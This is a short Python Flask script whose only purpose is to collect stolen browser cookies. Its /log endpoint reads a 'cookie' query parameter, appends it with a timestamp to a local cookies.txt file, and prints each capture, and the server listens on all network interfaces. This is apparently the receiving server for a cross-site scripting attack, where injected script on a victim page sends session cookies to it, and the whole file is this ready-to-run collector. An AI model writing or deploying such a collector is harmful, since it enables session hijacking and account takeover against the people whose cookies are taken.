#!/usr/bin/env python3
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "cookies.txt"

@app.route('/log')
def log_cookie():
    cookie = request.args.get('cookie')
    if cookie:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {cookie}\n")
        print(f"Got cookie: {cookie}")
        return "Cookie logged!"
    return "No cookie received."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)